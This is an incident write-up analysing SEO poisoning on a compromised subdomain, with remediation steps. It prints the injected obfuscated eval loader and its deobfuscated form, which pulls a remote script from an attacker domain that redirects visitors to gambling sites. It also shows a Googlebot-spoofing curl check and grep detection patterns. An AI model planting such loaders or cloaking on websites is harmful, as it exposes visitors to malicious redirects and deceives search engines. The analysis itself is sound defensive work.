# SEO Poisoning

It has been identified that the subdomain `REDACTED` is being used for SEO poisoning and redirecting visitors (especially indexing bots such as Googlebot) to gambling sites and malicious content.
The legitimate page is replaced by malicious HTML only when access is detected to be coming from a search engine bot.

SEO Poisoning is an attack designed to manipulate search engine algorithms, promoting malicious pages to appear in top positions in search results.

## Analysis

By performing a Google search for the domain `REDACTED`, it was possible to see that it is indexing several suspicious sites, mainly related to gambling:

```bash
site:https://REDACTED
```

Accessing the URL and capturing the request using a proxy (BurpSuite), it was possible to identify the execution of an obfuscated script:

![seopoisoning 3](/static/images/seo-poisoning-images/image3.png)

```bash
<script>eval(function(p,a,c,k,e,d){e=function(c){return c};if(!''.replace(/^/,String)){while(c--) {d[c]=k[c]||c}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]) {p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('9.8("<0 7=\\"6://5.4.3/2.1\\"> </0>");',10,10,'script|js|brxxx|xyz|openconf|july|hxxps|src|write|document'.split('|'),0,{})) </script>
```

Após realizar a desofuscação, verificou-se que o código redireciona para a URL `hxxps://july.openconf[.]xyz/brxxx.js` :

```bash
document.write("<script src=\"hxxps://july.openconf.xyz/brxxx.js\"></script>");
```

Accessing the URL revealed that the **brxxx.js** JavaScript file redirects the user to the malicious site `hxxps://9d[.]bet[.]br/?dt142s01`, in addition to loading external tracking SDKs and executing other suspicious scripts.

## SEO Poisoning Confirmation

When the URL is accessed directly, the server returns a 404 error. However, when the same page is accessed via Google, it redirects to the malicious page.

This happens because, during Google’s indexing process, the server delivers an altered (malicious) HTML instead of the legitimate content. This technique is also known as Cloaking.

The simulation was carried out as follows:

**Simulating Googlebot access:**

```bash
curl -A "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" https://REDACTED
```

![seopoisoning 1](/static/images/seo-poisoning-images/image1.png)

**Normal access:**

```bash
curl https://REDACTED
```

## Conclusion

Based on the evidence presented, there are strong indications that the server has been compromised and is being used to spread malicious content, especially through **SEO poisoning**, to redirect visitors and indexing bots to gambling sites and other potentially dangerous pages.

## Recommendations

- Locate infected files by searching directly for the identified malicious script pattern:

```bash
grep -R "eval(function(p,a,c,k,e,d)" /var/www/ 2>/dev/null
```

OBS: Note: Adjust **/var/www/** to the actual application path on the server.

- Search for direct references to the malicious URL:

```bash
grep -R "july.openconf.xyz" /var/www/ 2>/dev/null
```

- Check for persistence via suspicious scheduled tasks:

```bash
cat /etc/crontab
crontab -l
```

- Check for suspicious connections and processes:

```bash
ps aux
ss -tulnp
```

- Monitor suspicious processes using the pspy tool (https://github.com/DominicBreuker/pspy) to identify automated executions, backdoors, or rootkits that may reactivate the malicious code after cleanup.
- Block the malicious URL `july.openconf[.]xyz` in the firewall, proxy, or IDS to prevent reinfection and new payload downloads.
